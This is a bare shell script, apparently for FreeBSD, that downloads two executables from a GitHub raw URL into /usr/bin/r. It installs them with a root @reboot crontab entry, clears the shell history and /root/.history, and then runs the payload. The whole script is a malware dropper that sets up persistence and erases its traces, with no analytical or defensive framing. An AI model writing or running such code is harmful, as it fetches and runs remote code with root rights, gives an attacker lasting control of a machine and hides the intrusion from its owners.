killall -9 reve

rm -rf /usr/bin/r
mkdir /usr/bin/r
cd /usr/bin/r

fetch -q https://raw.githubusercontent.com/HeyyouLor/lolo/master/reve
chmod +x reve

fetch -q https://raw.githubusercontent.com/HeyyouLor/lolo/master/e.sh
chmod +x e.sh

if [ $(cat /etc/crontab | grep -o "/usr/bin/r/" | wc -l | tr -d " ") -ne 1 ]; then
	echo "@reboot root /usr/bin/r/e.sh > /dev/null 2>&1" >> /etc/crontab
fi

cat /etc/crontab

history -c
echo '' > /root/.history

./e.sh
